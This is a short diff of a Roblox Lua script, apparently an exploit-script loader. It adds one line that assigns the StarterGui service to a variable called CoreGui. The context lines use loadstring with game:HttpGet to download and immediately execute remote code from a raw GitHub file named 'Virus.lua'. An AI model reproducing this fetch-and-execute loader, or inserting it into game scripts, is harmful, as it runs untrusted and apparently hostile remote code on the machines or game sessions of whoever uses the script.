@@ -1,3 +1,4 @@
+local CoreGui = game:GetService("StarterGui")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/Virus.lua"))()
 wait(0.1)
 game:GetService("StarterGui")
